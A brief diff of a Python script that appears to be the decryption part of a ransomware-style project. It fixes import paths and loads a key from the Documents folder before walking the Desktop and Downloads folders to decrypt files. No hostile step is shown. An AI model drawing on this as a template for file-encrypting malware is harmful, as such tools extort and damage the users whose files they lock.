@@ -1,5 +1,5 @@
-from Decrypt_Func import Decrypt
-from Decrypt_Func import s
+from Functions.Decrypt_Func import Decrypt
+from Functions.Decrypt_Func import s
 from os import path,getenv,remove
 from os import system as sys
 from shutil import copyfile
@@ -33,11 +33,11 @@ if s=='Windows':
 		except:
 			pass
 
-	Decrypt.getkey()
-
 	desktop = path.expanduser('~/Desktop')
 	documents = path.expanduser('~/Documents')
 	downloads = path.expanduser('~/Downloads')
+
+	Decrypt.getkey(documents)
 
 	Decrypt.d_iterator(desktop)
 	Decrypt.d_iterator(downloads)
